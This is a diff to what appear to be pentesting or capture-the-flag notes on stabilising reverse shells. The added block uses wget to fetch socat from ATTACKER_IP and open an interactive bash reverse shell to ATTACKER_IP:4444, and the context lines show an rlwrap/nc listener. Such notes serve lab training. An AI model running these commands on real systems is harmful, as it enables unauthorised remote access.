@@ -95,6 +95,14 @@ stty raw -echo; fg
 
 the above also prevents Ctrl + C killing the reverse shell. if the shell dies, your shell will be boned as no commands sent will be returned. to fix this: type reset and press enter (Thanks TryHackMe)
 
+if python, perl etc are not available (or not accessible by www-data or whoever), but you can wget, then wget socat:
+
+```
+wget -q http://ATTACKER_IP:8000/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
+export TERM=xterm-256color
+export SHELL=bash
+```
+
 catching better shells by default (needs rlwrap to be installed):
 
 `rlwrap nc -lvnp <port>`
